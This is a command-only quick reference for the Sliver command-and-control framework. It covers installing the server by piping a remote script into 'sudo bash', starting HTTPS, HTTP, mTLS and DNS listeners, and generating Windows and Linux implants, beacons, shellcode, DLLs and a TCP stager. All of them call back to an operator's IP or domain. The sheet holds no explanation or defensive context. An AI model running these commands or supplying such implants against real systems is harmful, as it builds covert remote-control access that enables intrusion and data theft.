# Sliver C2 — Quick Reference (commands only)

## Install
curl https://sliver.sh/install | sudo bash
sliver-server

## Listeners
https -l 443 -d <your-domain.com>
http -l 80
mtls -l 8888
dns -d <c2.domain.com>
jobs
jobs -k <job-id>

## Generate Implants
generate --http <ip> --os windows --arch amd64 --save implant.exe
generate --http <ip> --os linux --arch amd64 --save implant
generate beacon --http <ip> --seconds 30 --jitter 10 --os windows --save beacon.exe
generate --http <ip> --format shellcode --save implant.bin
generate --http <ip> --format shared --save implant.dll
generate stager --lhost <ip> --lport 8443 --protocol tcp --save stager.bin
implants
